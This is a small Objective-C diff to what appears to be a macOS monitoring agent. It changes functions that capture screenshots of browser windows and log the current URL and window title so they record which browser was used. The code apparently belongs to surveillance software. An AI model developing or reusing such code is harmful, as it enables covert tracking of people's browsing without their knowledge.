@@ -30,7 +30,7 @@ static BOOL gIsSnapshotActive = NO;
 static u_int gSnapID          = 0;
 
 
-void logSnapshot(NSData *imageData)
+void logSnapshot(NSData *imageData, int browserType)
 {
   NSMutableData *entryData = [[NSMutableData alloc] initWithLength: sizeof(urlSnapAdditionalStruct)];
   NSString *_windowName;
@@ -71,7 +71,7 @@ void logSnapshot(NSData *imageData)
 
   urlSnapAdditionalStruct *urlSnapshotAdditionalHeader = (urlSnapAdditionalStruct *)[entryData bytes];
   urlSnapshotAdditionalHeader->version        = LOG_URLSNAP_VERSION;
-  urlSnapshotAdditionalHeader->browserType    = BROWSER_SAFARI;
+  urlSnapshotAdditionalHeader->browserType    = browserType;
   urlSnapshotAdditionalHeader->urlNameLen     = [gPrevURL
     lengthOfBytesUsingEncoding: NSUTF16LittleEndianStringEncoding];
   urlSnapshotAdditionalHeader->windowTitleLen = [_windowName
@@ -218,7 +218,7 @@ void logSnapshot(NSData *imageData)
   [_windowName release];
 }
 
-BOOL grabSnapshot()
+BOOL grabSnapshot(int browserType)
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
 
@@ -269,7 +269,7 @@ BOOL grabSnapshot()
   //
   // Log Snapshot
   //
-  logSnapshot(tempData);
+  logSnapshot(tempData, browserType);
 
   [bitmapRep release];
   CGImageRelease(screenShot);
@@ -541,7 +541,7 @@ void URLStartAgent()
       infoLog(@"Grabbing snapshot");
 #endif
 
-      grabSnapshot();
+      grabSnapshot(browserType);
     }
   
   [aDict release];
